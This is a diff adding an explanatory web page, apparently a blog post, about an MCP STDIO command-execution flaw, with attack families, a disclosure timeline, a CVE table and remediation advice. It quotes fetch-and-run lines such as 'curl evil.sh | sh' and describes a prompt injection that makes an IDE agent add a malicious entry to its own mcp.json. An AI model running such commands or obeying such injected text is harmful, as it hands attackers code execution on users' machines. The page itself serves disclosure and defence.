+    <span class="tok-key">args</span>=[<span class="tok-str">"-y"</span>, <span class="tok-str">"some-mcp-server"</span>, <span class="tok-str">"--flag"</span>],
+    <span class="tok-key">env</span>={<span class="tok-str">"SECRET"</span>: <span class="tok-str">"..."</span>},
+)
+
+<span class="tok-cmt">async with</span> stdio_client(params) <span class="tok-cmt">as</span> (read, write):
+    ...</pre>
+    </div>
+
+    <div class="prose">
+      <p>The shape is identical in every SDK. TypeScript's <code class="inline">StdioClientTransport</code>, Java's <code class="inline">StdioServerTransport</code>, Rust's <code class="inline">TokioChildProcess</code> — all wrap an OS-level spawn of a caller-supplied command. Any component upstream that lets a model, a UI form, or a config file populate that string is an RCE primitive.</p>
+    </div>
+
+    <div class="pull-quote">
+      "Pass in a malicious command, receive an error — and the command still runs. No sanitization warnings. No red flags in the developer toolchain. Nothing."
+      <cite>— OX Security Research Team</cite>
+    </div>
+  </div>
+
+  <!-- SECTION 3: ATTACK FAMILIES -->
+  <div class="section">
+    <div class="section-label">03 · Attack Surface</div>
+    <h2>Four Families, One Root Cause</h2>
+    <div class="prose">
+      <p>The same underlying pattern manifests in four distinct exploitation classes, each targeting a different layer of the stack. What makes this a <em>supply chain</em> event rather than a single CVE is that none of these vendors wrote the bug — they inherited the default.</p>
+    </div>
+
+    <div class="cards-grid">
+      <div class="card card-red">
+        <div class="card-icon-badge">Family 01</div>
+        <h4>Unauthenticated UI Injection</h4>
+        <p>Web dashboards in Agent Zero, Langchain-Chatchat, Jaaz, and others accept an MCP config via an unauthenticated form. The <code class="inline">command</code> string is saved, executed on first connect, and runs under the framework's identity.</p>
+      </div>
+      <div class="card card-red">
+        <div class="card-icon-badge">Family 02</div>
+        <h4>Hardening Bypass</h4>
+        <p>Platforms that attempted a defense — e.g. Flowise's allowlist of <code class="inline">npx</code>/<code class="inline">uvx</code> — get bypassed with hostile arguments. <code class="inline">npx -c "curl … | sh"</code> is still <code class="inline">npx</code>. The allowlist guards the binary name; argv is unrestricted.</p>
+      </div>
+      <div class="card card-red">
+        <div class="card-icon-badge">Family 03</div>
+        <h4>Zero-Click Prompt Injection</h4>
+        <p>In AI IDEs (Windsurf, Cursor), the agent can write to its own <code class="inline">mcp.json</code>. A poisoned README, web page, or file opened in the editor injects a prompt that tells the agent to append a malicious STDIO entry. Next reload → local RCE.</p>
+      </div>
+      <div class="card card-red">
+        <div class="card-icon-badge">Family 04</div>
+        <h4>Poisoned Marketplaces</h4>
+        <p>OX submitted a benign proof-of-concept to 11 public MCP registries; <strong>9 accepted it</strong>. MCP servers ship as text blobs carrying a command — closer to an install script than a package. No sandbox, no capability model, no signature baseline.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 4: TIMELINE -->
+  <div class="section">
+    <div class="section-label">04 · Disclosure Timeline</div>
+    <h2>Six Months of Disclosure, Three Layers of Silence</h2>
+    <div class="prose">
+      <p>Below is an interactive version of the disclosure timeline. Three horizontal swim lanes: the <strong style="color:var(--accent)">Root Layer</strong> (Anthropic itself), the <strong style="color:var(--yellow)">Transport Layer</strong> (frameworks like LangChain, LiteLLM, FastMCP), and the <strong style="color:var(--purple)">Application Layer</strong> (end tools like Cursor, Windsurf, DocsGPT). Filter a layer to isolate it — the pattern across the stack is the whole story.</p>
+    </div>
+
+    <div class="tl-wrap">
+      <div class="tl-title-row">
+        <div class="tl-title">MCP Disclosure Timeline · Nov 2025 → Apr 2026</div>
+        <div class="tl-filters" role="tablist">
+          <button class="tl-filter active" data-filter="all" role="tab">All</button>
+          <button class="tl-filter" data-filter="root" role="tab">Root</button>
+          <button class="tl-filter" data-filter="transport" role="tab">Transport</button>
+          <button class="tl-filter" data-filter="app" role="tab">Application</button>
+        </div>
+      </div>
+
+      <div class="tl-grid">
+        <!-- header row -->
+        <div></div>
+        <div class="tl-month-header">Nov '25</div>
+        <div class="tl-month-header">Dec '25</div>
+        <div class="tl-month-header">Jan '26</div>
+        <div class="tl-month-header">Feb '26</div>
+        <div class="tl-month-header">Mar '26</div>
+        <div class="tl-month-header">Apr '26</div>
+
+        <!-- ROOT LAYER -->
+        <div class="tl-row-label root">Root<small>Anthropic</small></div>
+        <div class="tl-cell"></div>
+        <div class="tl-cell"></div>
+        <div class="tl-cell">
+          <div class="tl-event root">
+            <span class="tl-event-date">Jan 7</span>
+            <span class="tl-event-body">Anthropic contacted → <em>"by design"</em></span>
+          </div>
+          <div class="tl-event root">
+            <span class="tl-event-date">Jan 16</span>
+            <span class="tl-event-body">Anthropic updates <code style="font-family:var(--mono);font-size:10px;">SECURITY.md</code></span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event root">
+            <span class="tl-event-date">Feb 13</span>
+            <span class="tl-event-body">Anthropic approves public disclosure</span>
+          </div>
+        </div>
+        <div class="tl-cell"></div>
+        <div class="tl-cell">
+          <div class="tl-event root pub">
+            <span class="tl-event-date">Apr 15</span>
+            <span class="tl-event-body"><strong>Public disclosure:</strong> "The Mother of All Supply Chains"</span>
+          </div>
+        </div>
+
+        <!-- TRANSPORT LAYER -->
+        <div class="tl-row-label transport">Transport<small>Frameworks</small></div>
+        <div class="tl-cell"></div>
+        <div class="tl-cell">
+          <div class="tl-event transport">
+            <span class="tl-event-date">Dec 31</span>
+            <span class="tl-event-body">LangChain contacted → <em>"by design"</em></span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event transport">
+            <span class="tl-event-date">Jan 12</span>
+            <span class="tl-event-body">FastMCP, Flowise, Upsonic contacted</span>
+          </div>
+          <div class="tl-event transport">
+            <span class="tl-event-date">Jan 13</span>
+            <span class="tl-event-body">Gemini-CLI → "duplicate, no CVE"</span>
+          </div>
+          <div class="tl-event transport">
+            <span class="tl-event-date">Jan 19</span>
+            <span class="tl-event-body">LiteLLM contacted</span>
+          </div>
+          <div class="tl-event transport">
+            <span class="tl-event-date">Jan 22</span>
+            <span class="tl-event-body">Browser-Use → <em>"by design"</em></span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event transport">
+            <span class="tl-event-date">Feb 6</span>
+            <span class="tl-event-body">Flowise &amp; Upsonic patched <span class="tl-status ok">✓</span></span>
+          </div>
+          <div class="tl-event transport">
+            <span class="tl-event-date">Feb 10</span>
+            <span class="tl-event-body">FastMCP → <em>"by design"</em></span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event transport">
+            <span class="tl-event-date">Mar 17</span>
+            <span class="tl-event-body">CVE-2026-30623 (LiteLLM), CVE-2026-30625 (Upsonic)</span>
+          </div>
+        </div>
+        <div class="tl-cell"></div>
+
+        <!-- APPLICATION LAYER -->
+        <div class="tl-row-label app">Application<small>End Tools</small></div>
+        <div class="tl-cell">
+          <div class="tl-event app">
+            <span class="tl-event-date">Nov 9</span>
+            <span class="tl-event-body">GPT-Researcher contacted</span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event app">
+            <span class="tl-event-date">Dec 25</span>
+            <span class="tl-event-body">CVE-2025-65720 (GPT-Researcher)</span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event app">
+            <span class="tl-event-date">Jan 11</span>
+            <span class="tl-event-body">LangFlow + 3 undisclosed contacted</span>
+          </div>
+          <div class="tl-event app">
+            <span class="tl-event-date">Jan 13</span>
+            <span class="tl-event-body">Claude Code, Cursor, Windsurf contacted</span>
+          </div>
+          <div class="tl-event app">
+            <span class="tl-event-date">Jan 19</span>
+            <span class="tl-event-body">GitHub Copilot → "not a security vulnerability"</span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event app">
+            <span class="tl-event-date">Feb 2</span>
+            <span class="tl-event-body">DocsGPT confirms fix <span class="tl-status ok">✓</span></span>
+          </div>
+          <div class="tl-event app">
+            <span class="tl-event-date">Feb 11</span>
+            <span class="tl-event-body">CVE-2026-26015 (DocsGPT)</span>
+          </div>
+          <div class="tl-event app">
+            <span class="tl-event-date">Feb 23</span>
+            <span class="tl-event-body">Cursor rejects report <span class="tl-status bad">✕</span></span>
+          </div>
+        </div>
+        <div class="tl-cell">
+          <div class="tl-event app">
+            <span class="tl-event-date">Mar 17</span>
+            <span class="tl-event-body">6 CVEs assigned: Windsurf, Jaaz, Langchain-Chatchat, Fay, Agent-Zero</span>
+          </div>
+          <div class="tl-event app">
+            <span class="tl-event-date">Mar 18</span>
+            <span class="tl-event-body">CVE-2026-33224 (Bisheng)</span>
+          </div>
+        </div>
+        <div class="tl-cell"></div>
+      </div>
+
+      <div class="tl-hint">› click a layer filter to isolate · scroll horizontally on small screens</div>
+    </div>
+
+    <div class="callout">
+      <div class="callout-lbl">What the shape tells you</div>
+      <p>Several weeks of individual "by design" responses at the root and transport layers, then a coordinated <strong>March 17 CVE burst</strong> at the application layer. The protocol owner did not move. The downstream projects — each absorbing the risk individually — had to.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 5: CVE TABLE -->
+  <div class="section">
+    <div class="section-label">05 · The CVEs</div>
+    <h2>The 10 CVEs That Came From One Protocol</h2>
+    <div class="prose">
+      <p>Filter by status to see which projects moved and which are still sitting on a reported advisory. Every row traces back to the same STDIO pattern.</p>
+    </div>
+
+    <div class="cve-filters" role="tablist">
+      <button class="cve-filter active" data-status="all" role="tab">All</button>
+      <button class="cve-filter" data-status="patched" role="tab">Patched</button>
+      <button class="cve-filter" data-status="reported" role="tab">Reported</button>
+      <button class="cve-filter" data-status="warning" role="tab">Warning</button>
+    </div>
+
+    <div class="data-table">
+      <table class="cve-table">
+        <thead>
+          <tr>
+            <th>CVE</th>
+            <th>Project</th>
+            <th>Vector</th>
+            <th>Severity</th>
+            <th>Status</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr data-status="reported">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-65720" target="_blank" rel="noopener">CVE-2025-65720</a></td>
+            <td>GPT Researcher</td>
+            <td>UI injection / reverse shell</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-reported">Reported</span></td>
+          </tr>
+          <tr data-status="patched">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30623" target="_blank" rel="noopener">CVE-2026-30623</a></td>
+            <td>LiteLLM</td>
+            <td>Authenticated RCE via JSON config</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-patched">Patched</span></td>
+          </tr>
+          <tr data-status="reported">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30624" target="_blank" rel="noopener">CVE-2026-30624</a></td>
+            <td>Agent Zero</td>
+            <td>Unauthenticated UI injection</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-reported">Reported</span></td>
+          </tr>
+          <tr data-status="reported">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30618" target="_blank" rel="noopener">CVE-2026-30618</a></td>
+            <td>Fay Framework</td>
+            <td>Unauthenticated Web-GUI RCE</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-reported">Reported</span></td>
+          </tr>
+          <tr data-status="patched">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33224" target="_blank" rel="noopener">CVE-2026-33224</a></td>
+            <td>Bisheng</td>
+            <td>Authenticated UI injection (open registration)</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-patched">Patched</span></td>
+          </tr>
+          <tr data-status="reported">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30617" target="_blank" rel="noopener">CVE-2026-30617</a></td>
+            <td>Langchain-Chatchat</td>
+            <td>Unauthenticated UI injection</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-reported">Reported</span></td>
+          </tr>
+          <tr data-status="reported">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33224" target="_blank" rel="noopener">CVE-2026-33224</a></td>
+            <td>Jaaz</td>
+            <td>Unauthenticated UI injection</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-reported">Reported</span></td>
+          </tr>
+          <tr data-status="warning">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30625" target="_blank" rel="noopener">CVE-2026-30625</a></td>
+            <td>Upsonic</td>
+            <td>Allowlist bypass via npx/npm args</td>
+            <td><span class="badge-pill pill-high">High</span></td>
+            <td><span class="badge-pill pill-warning">Warning</span></td>
+          </tr>
+          <tr data-status="reported">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30615" target="_blank" rel="noopener">CVE-2026-30615</a></td>
+            <td>Windsurf</td>
+            <td>Zero-click prompt injection → local RCE</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-reported">Reported</span></td>
+          </tr>
+          <tr data-status="patched">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26015" target="_blank" rel="noopener">CVE-2026-26015</a></td>
+            <td>DocsGPT</td>
+            <td>MITM transport-type substitution</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-patched">Patched</span></td>
+          </tr>
+          <tr data-status="reported">
+            <td class="td-mono"><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40933" target="_blank" rel="noopener">CVE-2026-40933</a></td>
+            <td>Flowise</td>
+            <td>Allowlist bypass / argv injection</td>
+            <td><span class="badge-pill pill-critical">Critical</span></td>
+            <td><span class="badge-pill pill-reported">Reported</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout callout-blue">
+      <div class="callout-lbl">Prior art — this class of bug is not new</div>
+      <p>The same root cause has been filed independently many times: <code class="inline">CVE-2025-49596</code> (MCP Inspector), <code class="inline">CVE-2026-22252</code> (LibreChat), <code class="inline">CVE-2026-22688</code> (WeKnora), <code class="inline">CVE-2025-54994</code> (<code class="inline">@akoskm/create-mcp-server-stdio</code>), <code class="inline">CVE-2025-54136</code> (Cursor). Each landed on a different vendor's queue — because at the protocol level, nobody owns it.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 6: ANTHROPIC'S POSITION -->
+  <div class="section">
+    <div class="section-label">06 · The Argument</div>
+    <h2>"Expected Behavior" vs. Secure by Design</h2>
+    <div class="prose">
+      <p>Anthropic's position is defensible on narrow technical grounds: STDIO MCP is a local transport, and a local transport that runs a binary you passed it is, in one sense, doing what it says on the tin. The problem is what happens when that transport's configuration format becomes reachable by untrusted inputs — model outputs, web UIs, marketplace payloads, repo files an IDE agent reads.</p>
+
+      <p>Every one of the four attack families above is a variation on the same theme: something upstream of <code class="inline">StdioServerParameters</code> got closer to <em>untrusted</em> than the protocol assumed. Shifting that boundary is exactly what a "secure by default" transport would do — <code class="inline">command</code> as an opaque executable reference, <code class="inline">args</code> as an allowlisted whitelist, a capability manifest shipped with each server. None of that exists.</p>
+    </div>
+
+    <div class="pull-quote">
+      "What made this a supply chain event rather than a single CVE is that one architectural decision, made once, propagated silently into every language, every downstream library, and every project that trusted the protocol to be what it appeared to be. Shifting responsibility to implementers does not transfer the risk. It just obscures who created it."
+      <cite>— OX Security, "The Mother of All AI Supply Chains"</cite>
+    </div>
+
+    <div class="prose">
+      <p>The disclosure landed days after Anthropic unveiled <strong>Claude Mythos</strong>, pitched as a tool to help secure the world's software. OX's framing is hard to miss: apply that same commitment to the protocol you own.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 7: REMEDIATION -->
+  <div class="section">
+    <div class="section-label">07 · What You Can Do</div>
+    <h2>Remediation — Until the Protocol Moves</h2>
+    <div class="prose">
+      <p>Because the vulnerability is architectural, there is no patch you can pull. Defense is about shrinking the distance between untrusted input and <code class="inline">StdioServerParameters</code>, and limiting blast radius when that boundary fails.</p>
+    </div>
+
+    <div class="cards-grid">
+      <div class="card card-red">
+        <div class="card-icon-badge">Control 01</div>
+        <h4>Treat MCP Config as Code</h4>
+        <p>Never let user input — including model output — flow into <code class="inline">command</code> or <code class="inline">args</code>. Use a fixed, pre-configured set of allowed MCP servers, stored outside any directory the agent can write.</p>
+      </div>
+      <div class="card card-green">
+        <div class="card-icon-badge">Control 02</div>
+        <h4>Sandbox Every MCP Server</h4>
+        <p>Run each MCP process in a container with its own filesystem, no host keys, no cloud creds, no shell access. Docker MCP Toolkit and user-namespace isolation are both viable baselines.</p>
+      </div>
+      <div class="card card-red">
+        <div class="card-icon-badge">Control 03</div>
+        <h4>Block Public Exposure</h4>
+        <p>LLM gateways and research tools with API keys and DB credentials should never have a public IP. The 7K publicly accessible MCP servers OX found are the low-hanging targets.</p>
+      </div>
+      <div class="card card-blue">
+        <div class="card-icon-badge">Control 04</div>
+        <h4>Verified Sources Only</h4>
+        <p>Pin to the <a href="https://github.com/modelcontextprotocol/registry" target="_blank" rel="noopener">official GitHub MCP Registry</a> or a curated internal mirror. 9 of 11 public registries accepted a malicious payload — the long tail is untrusted by default.</p>
+      </div>
+      <div class="card card-green">
+        <div class="card-icon-badge">Control 05</div>
+        <h4>Log Every Tool Invocation</h4>
+        <p>Treat MCP tool calls the way you'd treat <code class="inline">exec()</code>. Log command, args, env snapshot, and destination IPs. Alert on unexpected outbound traffic — exfiltration shows up there first.</p>
+      </div>
+      <div class="card card-blue">
+        <div class="card-icon-badge">Control 06</div>
+        <h4>Upgrade the Patched Stack</h4>
+        <p>LiteLLM, Bisheng, DocsGPT, Flowise, Upsonic have fixes. Upgrade everywhere (including CI runners and images). For unpatched vendors, disable the MCP integration or firewall the input path.</p>
+      </div>
+    </div>
+
+    <h3>Immediate Action Checklist</h3>
+
+    <ul class="dl">
+      <li>Audit for direct use of <code class="inline">StdioServerParameters</code>, <code class="inline">StdioClientTransport</code>, or equivalents — flag any path where external input reaches <code class="inline">command</code>.</li>
+      <li>Lock down <code class="inline">mcp.json</code> permissions so the agent can't write its own MCP config (mitigates zero-click prompt injection in IDEs).</li>
+      <li>Upgrade LiteLLM, Bisheng, Flowise, Upsonic, and DocsGPT to their patched versions and pin the upgrade in lockfiles.</li>
+      <li>Disable or firewall any MCP-enabled service with a public-facing UI and an unauthenticated form field.</li>
+      <li>Move MCP processes into containers with least-privilege credentials; never pass host API keys into the process environment.</li>
+      <li>Add a SAST / pre-commit rule that flags any code path letting model output populate STDIO <code class="inline">command</code>/<code class="inline">args</code>.</li>
+      <li>If you're a vendor: implement argv allowlisting, reject commands with embedded shell metacharacters, ship a signed capability manifest with each MCP server.</li>
+    </ul>
+
+    <div class="callout callout-green">
+      <div class="callout-lbl">The uncomfortable baseline</div>
+      <p>You cannot wait for the protocol to change. Assume every STDIO MCP entry on a machine is a potential exec surface, isolate those machines accordingly, and treat any UI or agent that can write MCP configuration as a privileged tool. The goal is containment, not prevention — with an architectural vulnerability, prevention is out of your hands.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 8: CLOSING -->
+  <div class="section">
+    <div class="section-label">08 · Closing Thoughts</div>
+    <h2>The Protocol Owns the Ecosystem It Enables</h2>
+    <div class="prose">
+      <p>Individual CVEs are footguns. A hundred CVEs tracing back to one line in one reference SDK is a <em>policy choice</em>. Anthropic's position — that implementers are responsible for the consequences of the default they inherit — is structurally similar to how every other insecure-by-default protocol in history was defended, right up until it wasn't.</p>
+
+      <p>MCP is the emergent standard for how AI agents communicate. Every company shipping an agent is, today, shipping on top of this default. The question is no longer whether the STDIO transport is dangerous — OX's ten CVEs settle that. The question is whether the protocol maintainers treat safe defaults as their job or as somebody else's. Until then, the ecosystem pays interest on a bug it did not write.</p>
+    </div>
+
+    <div class="callout callout-blue">
+      <div class="callout-lbl">Primary sources</div>
+      <p><a href="https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/" target="_blank" rel="noopener">OX Security — original advisory</a></p>
+      <p><a href="https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-technical-deep-dive/" target="_blank" rel="noopener">OX Security — technical deep dive</a></p>
+      <p><a href="https://modelcontextprotocol.io/" target="_blank" rel="noopener">Model Context Protocol — official spec</a></p>
+      <p><a href="https://github.com/modelcontextprotocol" target="_blank" rel="noopener">MCP reference SDKs on GitHub</a></p>
+      <p><a href="https://www.reddit.com/r/BetterOffline/comments/1so13it/systemic_flaw_in_anthropics_mcp_protocol_could/" target="_blank" rel="noopener">Practitioner discussion — r/BetterOffline</a></p>
+    </div>
+  </div>
+
+</div><!-- /page-wrap -->
+
+<!-- FOOTER -->
+<footer>
+  <span>Published 2026-04-21 · Based on OX Security disclosure &amp; public CVE records</span>
+  <div class="footer-refs">
+    <a href="https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/" target="_blank" rel="noopener">OX Advisory</a>
+    <a href="https://modelcontextprotocol.io/" target="_blank" rel="noopener">MCP Spec</a>
+    <a href="/">← asadani.dev</a>
+  </div>
+</footer>
+
+<script>
+  // ===== RCE FLOW INTERACTIVE =====
+  const flowSteps = {
+    1: {
+      title: '01 · Main Application',
+      body: 'A framework or agent wants to start an MCP server over STDIO. It builds a <strong>StdioServerParameters</strong> object — a <code>command</code>, an <code>args</code> list, an <code>env</code> map — and hands it to the SDK. If any of those fields are sourced from a user, a model, a web form, a config file, or a registry lookup, the attack surface is already open.'
+    },
+    2: {
+      title: '02 · MCP SDK (Python / TS / Java / Rust)',
+      body: 'The SDK calls into the language\'s subprocess primitive — <code>subprocess.Popen</code>, <code>child_process.spawn</code>, <code>ProcessBuilder</code>, <code>TokioChildProcess</code>. <strong>There is no validation of the command string.</strong> No allowlist, no shell-metachar filter, no capability check. The protocol\'s reference implementation treats <code>command</code> as trusted configuration.'
+    },
+    3: {
+      title: '03 · Operating System spawns the process',
+      body: 'The OS runs the command as-is under the calling process\'s privileges. At this point every side effect the command has — <strong>filesystem writes, network connections, credential reads</strong> — has already happened. The SDK does not observe, does not sandbox, does not restrict.'
+    },
+    4: {
+      title: '04 · Is it actually an MCP server?',
+      body: 'The SDK now checks whether the spawned process speaks JSON-RPC over stdin/stdout. If yes → protocol handle returned. If no — because the attacker passed <code>curl evil.sh | sh</code>, not an MCP binary — the SDK raises an <strong>error</strong>. From the developer\'s perspective, "it failed." From the attacker\'s perspective, their command ran with full process privileges several steps ago.'
+    },
+    5: {
+      title: '05 · The command already executed',
+      body: 'Error propagated up the stack. No red flag, no alert, no log entry distinguishes "command was malicious" from "wrong path to binary." The only evidence is process accounting — which almost no MCP integration captures. <strong>This is the crux: the error is the wrong signal to act on, because it arrives after execution, not before.</strong>'
+    }
+  };
+
+  const flowDetail = document.getElementById('flow-detail');
+  const flowNodes = document.querySelectorAll('.flow-node');
+  function showStep(n) {
+    flowNodes.forEach(b => b.classList.toggle('active', b.dataset.step === String(n)));
+    const s = flowSteps[n];
+    flowDetail.innerHTML =
+      '<div class="flow-detail-title">' + s.title + '</div>' +
+      '<div class="flow-detail-body">' + s.body + '</div>';
+  }
+  flowNodes.forEach(btn => {
+    btn.addEventListener('click', () => showStep(btn.dataset.step));
+    btn.addEventListener('mouseenter', () => showStep(btn.dataset.step));
+  });
+  showStep(1);
+
+  // ===== TIMELINE FILTER =====
+  const tlFilters = document.querySelectorAll('.tl-filter');
+  const tlEvents = document.querySelectorAll('.tl-event');
+  tlFilters.forEach(btn => {
+    btn.addEventListener('click', () => {
+      tlFilters.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const f = btn.dataset.filter;
+      tlEvents.forEach(ev => {
+        if (f === 'all' || ev.classList.contains(f)) ev.classList.remove('dimmed');
+        else ev.classList.add('dimmed');
+      });
+    });
+  });
+
+  // ===== CVE TABLE FILTER =====
+  const cveFilters = document.querySelectorAll('.cve-filter');
+  const cveRows = document.querySelectorAll('.cve-table tbody tr');
+  cveFilters.forEach(btn => {
+    btn.addEventListener('click', () => {
+      cveFilters.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const s = btn.dataset.status;
+      cveRows.forEach(r => {
+        if (s === 'all' || r.dataset.status === s) r.classList.remove('hidden');
+        else r.classList.add('hidden');
+      });
+    });
+  });
+</script>
+
+</body>
+</html>
